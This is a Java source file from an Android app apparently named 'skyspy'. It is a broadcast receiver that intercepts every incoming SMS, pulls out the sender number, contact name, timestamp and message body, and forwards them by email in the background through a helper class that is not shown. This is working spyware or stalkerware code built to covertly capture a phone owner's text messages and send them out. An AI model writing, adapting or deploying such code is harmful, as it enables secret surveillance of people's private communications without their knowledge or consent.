package com.example.skyspy.app.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.example.skyspy.app.email.EmailHelper;

public class SmsReceivedListener extends BroadcastReceiver {

    private Context mContext;
    private Bundle mBundle;

    @Override
    public void onReceive(Context context, Intent intent) {
        mContext = context;
        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
            mBundle = intent.getExtras();
            new AsyncTask<String,Void,Void>() {
                @Override
                protected Void doInBackground(String... params) {
                    String letter = params[0];
                    EmailHelper.trySending(letter, mContext);
                    return null;
                }
            }.execute(getSmsDetails());
        }
    }

    private String getSmsDetails(){
        String message = "";
        SmsMessage[] msgs;
        String address, body;
        Long time;
        if(mBundle != null) {
            try {
                Object[] pdus = (Object[]) mBundle.get("pdus");
                msgs = new SmsMessage[pdus.length];
                for (int i = 0; i < msgs.length; i++) {
                    msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                    address = msgs[i].getOriginatingAddress();
                    body = msgs[i].getMessageBody();
                    time = msgs[i].getTimestampMillis();
                    if (i == 0) {
                        message += "Date: "+SmsHelper.convertDate(time)+"\n";
                        message += "Type: "+SmsHelper.INBOX+"\n";
                        message += "Number: "+address+"\n";
                        message += "Name: "+SmsHelper.getContactName(address, mContext)+"\n";
                        if (msgs.length == 1) {
                            message += "Body: "+SmsHelper.removeNewLine(body)+"\n";
                        } else {
                            message += "Body: "+SmsHelper.removeNewLine(body)+" ";
                        }
                    } else {
                        message += SmsHelper.removeNewLine(body)+" ";
                    }
                }
                if (msgs.length == 1) {
                    message += "_______________"+"\n";
                } else {
                    message += "\n"+"_______________"+"\n";
                }
            } catch (Exception e){
                e.printStackTrace();
            }
        }
        return message;
    }
}
